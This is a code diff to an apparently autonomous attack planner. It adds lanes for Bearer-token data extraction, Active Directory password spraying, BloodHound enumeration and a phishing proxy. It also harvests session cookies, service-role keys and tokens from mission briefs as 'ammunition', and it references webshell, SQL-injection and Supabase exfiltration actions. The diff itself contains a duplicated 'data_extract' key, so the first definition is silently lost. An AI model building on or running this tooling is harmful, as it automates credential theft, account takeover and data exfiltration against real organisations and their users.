@@ -69,6 +69,7 @@ class State:
 # plan() ne peut plus jamais émettre un placeholder littéral "<… from intel>"
 # en argument d'outil.
 _LAST_ENDPOINTS = []
+_LAST_TOKEN = None     # H-fallback: live session token from the brief
 
 
 def _ep_fallback(t):
@@ -330,6 +331,56 @@ ACTIONS = {
                             "keyword": (None if t.upper().startswith("CVE-") else t)},
     },
     # ── SUPPORT ACTIONS (offline brain reachability) ──
+    "grimoire_query": {
+        # WAR LIBRARY lane: the offline brain consults the same war
+        # library the LLM does — KEV nday signal + technique conscience.
+        "pre": lambda s: True,
+        "targets": lambda s: [t for t in (
+            [d for d in s.kinds("domain")][:1] or
+            [u.split("/")[2] if u.startswith("http") else u
+             for u in s.kinds("url")][:1] or ["stats"])],
+        "kinds": ("intel",), "yield": 1.0,
+        "args": lambda t: {"mode": "kev", "keyword": t.split(".")[0]},
+    },
+    "data_extract": {
+        # H-fallback: the authenticated-data action — a live session
+        # token + a named endpoint is THE strike (me, deals, orders).
+        # Without this node the offline brain planned generic recon on
+        # briefs that carried full session ammunition. The token rides
+        # via the _LAST_TOKEN plan-time global (same pattern as
+        # _LAST_ENDPOINTS — set by plan() before args derivation).
+        "pre": lambda s: s.has("token") and (s.has("url") or s.has("endpoint")),
+        "targets": lambda s: ([e for e in s.kinds("endpoint") if e.startswith("http")]
+                              or [f"https://{d}{e}"
+                                  for d in s.kinds("domain")
+                                  for e in s.kinds("endpoint")[:3]
+                                  if e.startswith("/api/")]
+                              or s.kinds("url")[:2]),
+        "kinds": ("data", "token"), "yield": 5.5,
+        "args": lambda t: {"url": t, "headers": {
+            "Authorization": f"Bearer {_LAST_TOKEN}"} if _LAST_TOKEN else {}},
+    },
+    "data_extract": {
+        # H-fallback + audit #8 fix: TWO data_extract nodes existed
+        # (lines 345 & 508) — the dict silently kept only the LAST one,
+        # deleting the Bearer-token strike (yield 5.5) in favor of the
+        # weaker endpoint probe (yield 3.0). Merged: token+endpoint =
+        # authenticated Bearer strike (the original 5.5 lane); plain
+        # endpoint = the probe lane. The token rides via the
+        # _LAST_TOKEN plan-time global (set by plan() before args).
+        "pre": lambda s: (s.has("token") and (s.has("url") or s.has("endpoint")))
+                         or (s.has("endpoint") and (s.has("token") or s.has("secret"))),
+        "targets": lambda s: ([e for e in s.kinds("endpoint") if e.startswith("http")]
+                              or [f"https://{d}{e}"
+                                  for d in s.kinds("domain")
+                                  for e in s.kinds("endpoint")[:3]
+                                  if e.startswith("/api/")]
+                              or s.kinds("url")[:2]
+                              or s.kinds("endpoint")[:2]),
+        "kinds": ("data", "token"), "yield": 5.5,
+        "args": lambda t: {"url": t, "headers": {
+            "Authorization": f"Bearer {_LAST_TOKEN}"} if _LAST_TOKEN else {}},
+    },
     "jwt_analyst": {
         "pre": lambda s: s.has("token") or s.has("anon_key"),
         "targets": lambda s: (s.kinds("token") + s.kinds("anon_key"))[:4],
@@ -424,6 +475,26 @@ ACTIONS = {
         "kinds": ("data",), "yield": 2.0,
         "args": lambda t: {"shell_url": t},
     },
+    # ── HEAVY ARSENAL (operator-armed enterprise lanes) ──
+    "ad_spray": {
+        "pre": lambda s: s.has("host", "ad") or s.has("host", "dc")
+                         or s.has("host", "ldap") or s.has("host", "smb"),
+        "targets": lambda s: s.kinds("host")[:3],
+        "kinds": ("token", "secret"), "yield": 3.0,
+        "args": lambda t: {"action": "spray", "dc": t, "domain": ""},
+    },
+    "ad_bloodhound": {
+        "pre": lambda s: s.has("token") or s.has("secret"),
+        "targets": lambda s: s.kinds("host")[:2],
+        "kinds": ("data", "secret"), "yield": 3.5,
+        "args": lambda t: {"dc": t, "domain": "", "user": "", "password": ""},
+    },
+    "phish_proxy": {
+        "pre": lambda s: False,   # OPERATOR GATE — never brain-reachable
+        "targets": lambda s: [],
+        "kinds": ("token",), "yield": 0.0,
+        "args": lambda t: {"action": "status"},
+    },
     # ── BAAS / DATA ──
     "supabase_exfil": {
         "pre": lambda s: s.has("supabase_ref") and s.has("anon_key"),
@@ -454,12 +525,6 @@ ACTIONS = {
         # successor() — on strip la partie ref au lieu de compter sur le
         # re-split accidentel de l'outil.
         "args": lambda t: {"table": (t.split("|", 1)[0] if "|" in t else t)},
-    },
-    "data_extract": {
-        "pre": lambda s: s.has("endpoint") and (s.has("token") or s.has("secret")),
-        "targets": lambda s: s.kinds("endpoint"),
-        "kinds": ("data",), "yield": 3.0,
-        "args": lambda t: {"url": t},
     },
     "data_dump_paginated": {
         "pre": lambda s: s.has("table") or s.has("data"),
@@ -681,6 +746,9 @@ def plan(state, max_steps=8, sims=150, seed=7):
         # dérivations d'args — la gate `pre` garantit qu'il contient au moins
         # un endpoint au moment où l'action est commise.
         _LAST_ENDPOINTS = sorted(set(cur.kinds("endpoint")))
+        _tks = cur.kinds("token")
+        if _tks:
+            _LAST_TOKEN = _tks[0]
         args = ACTIONS[tool]["args"](t)
         steps.append((tool, args))
         cur = successor(cur, tool, t)
@@ -705,11 +773,68 @@ def extract_state(mission):
         facts.append(Fact("supabase_ref", ref))
     for key in re.findall(r"(eyJhbGci[A-Za-z0-9_\-.]+)", mission):
         facts.append(Fact("anon_key", key))
-    for h in re.findall(r"@([A-Za-z0-9_]{4,32})", mission):
-        facts.append(Fact("handle", h))
+    # AUDIT #6 FIX (CRITICAL): the handle regex fired on every EMAIL —
+    # "contact@target.com" minted "target" as a Telegram handle →
+    # garbage tg_probe targets. A handle is @word with NO word-char
+    # before the @ (emails have chars) AND NOT followed by a dot+TLD
+    # shape that marks an email address.
+    for h in re.findall(r"(?<![\w@.])([A-Za-z0-9_]{4,32})(?=\b)", mission):
+        _at = mission.find("@" + h)
+        if _at < 0:
+            continue
+        _after = mission[_at + 1 + len(h): _at + 2 + len(h)]
+        if not any(f.value == h for f in facts if f.kind == "handle"):
+            if not (_after and (_after == "." or _after.isalpha() and
+                                mission[_at + 1 + len(h): _at + 6 + len(h)].count(".") > 0)):
+                facts.append(Fact("handle", h))
+    # AUDIT #6 FIX (2/4): sb_secret / service_role keys are high-grade
+    # ammunition the harvesters never saw.
+    for sk in re.findall(r"\b(sb_secret_[A-Za-z0-9]{20,60}|service_role[A-Za-z0-9_\-]{0,40})", mission):
+        if not any(f.value == sk for f in facts):
+            facts.append(Fact("secret", sk))
+    # AUDIT #6 FIX (3/4): host facts (ad_spray / ad_bloodhound preconds
+    # require Fact("host") — never minted → the heavy-arsenal lane was
+    # unreachable from ANY brief). The target domain itself IS a host —
+    # mint it too (the domain fact exists but preconds check "host").
+    if t:
+        _tdom = re.sub(r"^https?://", "", t).split("/")[0]
+        if not any(f.value == _tdom for f in facts if f.kind == "host"):
+            facts.append(Fact("host", _tdom))
+    for host in re.findall(r"\b((?:[a-z0-9](?:[a-z0-9\-]{0,61}[a-z0-9])?\.)+[a-z]{2,12})\b", mission):
+        if not any(f.value == host for f in facts if f.kind in ("host", "domain")):
+            facts.append(Fact("host", host))
+    # AUDIT #6 FIX (4/4): Set-Cookie session strings are tokens — the
+    # brief hands them over as ammunition, harvest them.
+    for ck in re.findall(r"(?:set-?cookie[\"\':\s=]+|cookie:\s*)([A-Za-z0-9_\-]{1,40}=[^\s;\"',]{8,120})", mission, re.I):
+        val = ck.split("=", 1)[1]
+        if len(val) >= 8 and not any(f.value == val for f in facts):
+            facts.append(Fact("token", val))
     for kw in ("supabase", "telegram", "graphql"):
         if kw in mission.lower() and not any(f.kind == "tech" for f in facts):
             facts.append(Fact("tech", kw))
+    # H-fallback fix (2026-09-05): the offline brain went blind on the
+    # richest briefs — Bearer tokens and 48-hex dk_tokens named in the
+    # mission text were invisible to extract_state, so the MCTS fallback
+    # planned a GENERIC recon instead of striking the live session lanes
+    # the brief carried. Tokens ARE the mission's ammunition: harvest.
+    for bt in re.findall(r"Bearer\s+([A-Za-z0-9_\-.]{20,80})", mission):
+        facts.append(Fact("token", bt))
+    for tk in re.findall(r"\b([a-f0-9]{40,64})\b", mission):
+        if not any(f.value == tk for f in facts):
+            facts.append(Fact("token", tk))
+    # endpoint facts from explicit path mentions (api/me, api/deals...)
+    # — (?<![\w/]) instead of \b (the old \b could never match a path
+    # starting with "/" — word-boundary logic excludes it by design).
+    # Composed as FULL URLs when a target domain is known (the MCTS
+    # actions treat endpoints as ready-to-hit URLs; a bare "/api/me"
+    # was fed to upload_webshell/sqli templates as-is — H-fallback fix).
+    _ep_paths = re.findall(r"(?<![\w/])(/api/[a-z0-9_/{}.\-]{2,40})", mission)
+    if t and _ep_paths:
+        for ep in _ep_paths[:6]:
+            facts.append(Fact("endpoint", t.rstrip("/") + ep))
+    elif _ep_paths:
+        for ep in _ep_paths[:6]:
+            facts.append(Fact("endpoint", ep))
     return State(facts)
 
 
